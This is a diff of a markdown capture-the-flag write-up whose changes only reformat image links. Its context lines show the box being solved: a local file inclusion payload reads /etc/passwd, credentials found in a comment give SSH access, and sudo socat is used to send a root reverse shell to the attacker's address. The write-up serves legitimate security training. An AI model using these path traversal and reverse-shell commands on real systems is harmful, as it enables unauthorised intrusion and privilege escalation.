@@ -30,11 +30,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 43.52 seconds`
 
 
-![[Pasted image 20210605114036.png]]
+![](Pastedimage20210605114036.png)
 
 Looks like a pretty standard blog. We see something interesting when we click on one of the `View details >>` buttons though (any of them):
 
-![[Pasted image 20210605114122.png]]
+![](Pastedimage20210605114122.png)
 
 Notice in the URL that there’s a parameter called `name`. This indicates that the website is including information from elsewhere, opening us up to a _Local File Inclusion_ attack.
 
@@ -49,7 +49,7 @@ In the end, we’ll have a payload that looks something like this `../../../../.
 Let’s try adding that now:
 `http://<Machine-IP>/article?name=../../../../../../etc/passwd`
 
-![[Pasted image 20210605114331.png]]
+![](Pastedimage20210605114331.png)
 
 Contents of `/etc/passwd`
 
@@ -64,14 +64,14 @@ Hey, look, there’s a username and password inside a comment in there!
 
 We can use the username and password we found to login over SSH as `falconfeast`:
 
-![[Pasted image 20210605113735.png]]
+![](Pastedimage20210605113735.png)
 
 ### Privilege Escalation:
 
 
 We start, as always, with `sudo -l` to check our current privileges. Let’s see if we’ve got access to anything that lets us upgrade here:
 
-![[Pasted image 20210605114947.png]]
+![](Pastedimage20210605114947.png)
 
 Well ain’t that interesting. Nice easy privesc here too — we’ve got sudo access for `socat`, which is essentially a more powerful (if more complex) version of Netcat. In other words, we can use socat to send ourselves a root shell. First, on your own attacking computer, run this command:
 
@@ -88,7 +88,7 @@ sudo socat tcp-connect:<your-ip-address>:1234 exec:bash,pty,stderr,setsid,sigint
 ```
 
 
-![[Pasted image 20210605120615.png]]
+![](Pastedimage20210605120615.png)
 
 
 ### Method 2:
@@ -99,9 +99,9 @@ Including both flags:
 
 **User Flag**
 
-![[Pasted image 20210605115211.png]]
+![](Pastedimage20210605115211.png)
 
 **Root Flag**
 
-![[Pasted image 20210605115704.png]]
+![](Pastedimage20210605115704.png)
 
